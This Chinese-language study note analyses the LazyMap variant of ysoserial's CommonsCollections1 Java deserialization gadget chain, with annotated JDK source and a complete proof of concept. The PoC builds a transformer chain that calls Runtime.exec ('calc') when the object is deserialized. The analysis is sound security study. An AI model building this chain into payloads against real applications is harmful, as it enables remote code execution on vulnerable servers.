分析下ysoserial中CC1的利用链

# 分析版本



# 分析过程

**与TransformerMap的CC1不同的是，在寻找InvokeTransformer.transform的方法调用时，我们选择LazyMap的get方法。**

```java
    public Object get(Object key) {
        // create value for key if key is not currently in the map
        if (map.containsKey(key) == false) {      //进入此判断
            Object value = factory.transform(key);//factory为InvokeTransformer
            map.put(key, value);
            return value;
        }
        return map.get(key);
    }
```

之后找get的方法调用，这里作者找到的还是AnnotationInvocationHandler类中的invoke方法。其实AnnotationInvocationHandler类实现了InvocationHandler，是java动态代理的写法，invoke方法是代理调用方法时调用自动调用的。java[动态代理可以参考](https://www.bilibili.com/video/BV16h411z7o9?p=3&vd_source=686636e30f91f8a12e28751943870859)

```java
    public Object invoke(Object proxy, Method method, Object[] args) {
        String member = method.getName();                  //这里member取的是动态代理代理的方法名字
        Class<?>[] paramTypes = method.getParameterTypes();//返回方法参数类型

        // Handle Object and Annotation methods
        if (member.equals("equals") && paramTypes.length == 1 && //不能进此循环 保证代理的方法名不是equals 方法参数数量不为1 并且 第一个参数类型不是Object类
            paramTypes[0] == Object.class)
            return equalsImpl(args[0]);
        if (paramTypes.length != 0)                              //不能进次循环 方法数量不为1
            throw new AssertionError("Too many parameters for an annotation method");

        switch(member) {                                   //方法名字不能为toString hashCode annotationType
        case "toString":
            return toStringImpl();
        case "hashCode":
            return hashCodeImpl();
        case "annotationType":
            return type;
        }

        // Handle annotation member accessors
        Object result = memberValues.get(member);          //构造方法输入的可控Map<String, Object> memberValues，调用get 也就是LazyMap调用get

        if (result == null)
            throw new IncompleteAnnotationException(type, member);

        if (result instanceof ExceptionProxy)
            throw ((ExceptionProxy) result).generateException();

        if (result.getClass().isArray() && Array.getLength(result) != 0)
            result = cloneArray(result);

        return result;
    }
```

更新Poc

这里动态代理是调用的Map的isEmpty()方法。方法没有参数，并且名字不为toString hashCode annotationType

```java
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object, Object> hashMap = new HashMap<>();
        Map<Object, Object> lazyMap = LazyMap.decorate(hashMap, chainedTransformer);
        //反射实例化AnnotationInvocationHandler
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = c.getDeclaredConstructor(Class.class , Map.class);
        constructor.setAccessible(true);
        InvocationHandler annotationInvocationHandler = (InvocationHandler) constructor.newInstance(Target.class, lazyMap);
        Map lazyMap1 = (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), new Class[]{Map.class}, annotationInvocationHandler);
        lazyMap1.isEmpty();
```

写到这里还没结束，因为我们最后要找到反序列化readObject方法。

作者这里用的还是AnnotationInvocationHandler类重写的readObject方法

因为在反序列化时要调用invoke方法，所以要保证代理调用了方法（方法满足方法没有参数，并且名字不为toString hashCode annotationType）。

在这里正好有个memberValues.entrySet()，memberValues是我们能控制的Map类，而entrySet()方法正好没有参数，并且名字不为toString hashCode annotationType。

这里就不用像CC1 TransformsMap链注意注释类的传参了，因为我们只要执行到`for (Map.Entry<String, Object> memberValue : memberValues.entrySet())`这行就可以。

**其实也可以找其他满足条件的类，不一定是AnnotationInvocationHandler类。**

```java
    private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException {
        s.defaultReadObject();

        // Check to make sure that types have not evolved incompatibly

        AnnotationType annotationType = null;
        try {
            annotationType = AnnotationType.getInstance(type);
        } catch(IllegalArgumentException e) {
            // Class is no longer an annotation type; time to punch out
            throw new java.io.InvalidObjectException("Non-annotation type in annotation serial stream");
        }

        Map<String, Class<?>> memberTypes = annotationType.memberTypes();

        // If there are annotation members without values, that
        // situation is handled by the invoke method.
        for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {  //遍历Map<String, object> memberValues是Map类 memberValue是键值对
            String name = memberValue.getKey();                     //取键值对的key, memberValue
            Class<?> memberType = memberTypes.get(name);            //返回key对应的映射(Value), Class<? extends Annotation> type
            if (memberType != null) {  // i.e. member still exists  //type中需要有memberValues的key
                Object value = memberValue.getValue();              //取键值对的value, memberValue
                if (!(memberType.isInstance(value) ||               //判断两个对象类型，value是否可以强制转化为memberType
                      value instanceof ExceptionProxy)) {           //value是否是ExceptionProxy的实例化对象
                    memberValue.setValue(                           //memberValue需要设置为AbstractInputCheckedMapDecorator
                        new AnnotationTypeMismatchExceptionProxy(   //runtime
                            value.getClass() + "[" + value + "]").setMember(
                                annotationType.members().get(name)));
                }
            }
        }
    }
```

最后的Poc

```java
public class cc1_poc_lazyMap {
    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ss.ser"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }

    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object, Object> hashMap = new HashMap<>();
        Map<Object, Object> lazyMap = LazyMap.decorate(hashMap, chainedTransformer);
        //反射实例化AnnotationInvocationHandler
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = c.getDeclaredConstructor(Class.class , Map.class);
        constructor.setAccessible(true);
        InvocationHandler annotationInvocationHandler = (InvocationHandler) constructor.newInstance(Target.class, lazyMap);
        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]{Map.class}, annotationInvocationHandler); //动态代理
        //System.out.println(lazyMap1.isEmpty());
        //lazyMap1.isEmpty();
        Object annotationInvocationHandler1 = constructor.newInstance(Target.class, mapProxy);

        serialize(annotationInvocationHandler1);
        unserialize("ss.ser");
    }
}
```